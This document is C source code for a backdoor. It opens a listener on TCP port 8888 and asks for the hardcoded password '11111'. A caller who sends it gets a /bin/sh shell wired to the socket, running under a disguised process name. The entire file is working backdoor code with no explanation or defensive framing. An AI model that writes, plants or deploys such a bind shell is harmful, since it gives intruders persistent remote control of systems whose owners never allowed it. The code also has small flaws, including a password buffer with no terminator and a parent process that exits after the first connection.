#include  <stdio.h> 
#include  <sys/socket.h> 
#include  <unistd.h> 
#include  <sys/types.h> 
#include  <netinet/in.h> 
#include  <stdlib.h>
#include <string.h>


int main(int argc, char **argv)
{
    int i, listenfd, goshyoujinnsama;
    pid_t pid;
    int len = 128;
    int port=8888;  
    char buf[len];
    socklen_t len2;
    struct sockaddr_in s_addr;
    struct sockaddr_in c_addr;
    char enterpass[32]="Stop! who are you ?";
    char welcome[32]="Welcome,master!";
    char password[5]="11111";
    char sorry[32]="heheda !";
 
    listenfd = socket(AF_INET,SOCK_STREAM,0);
    if (listenfd == -1){
        exit(1);
    }

    bzero(&s_addr,sizeof(s_addr));
    s_addr.sin_family=AF_INET;
    s_addr.sin_addr.s_addr=htonl(INADDR_ANY);
    s_addr.sin_port=htons(port);
    
    if (bind(listenfd, (struct sockaddr *)&s_addr, sizeof(s_addr)) == -1){
        exit(1);
    }
    if (listen(listenfd, 20)==-1){
        exit(1);
    }
    len2 = sizeof(c_addr);

    while(1){
        goshyoujinnsama = accept(listenfd, (struct sockaddr *)&c_addr, &len2);
        if((pid = fork()) > 0)
        {
            exit(0);
        }else if(!pid){
            close(listenfd);
            write(goshyoujinnsama, enterpass, strlen(enterpass));
            memset(buf,'\0', len);
            read(goshyoujinnsama, buf, len);
            if (strncmp(buf,password,5) !=0){
                write(goshyoujinnsama, sorry, strlen(sorry));
                close(goshyoujinnsama);
                exit(0);
            }else{
                write(goshyoujinnsama, welcome, strlen(welcome));
                dup2(goshyoujinnsama,0);
                dup2(goshyoujinnsama,1); 
                dup2(goshyoujinnsama,2);
                execl("/bin/sh", "toSyojinn", (char *) 0);
            }
        }
    }
    close(goshyoujinnsama);
}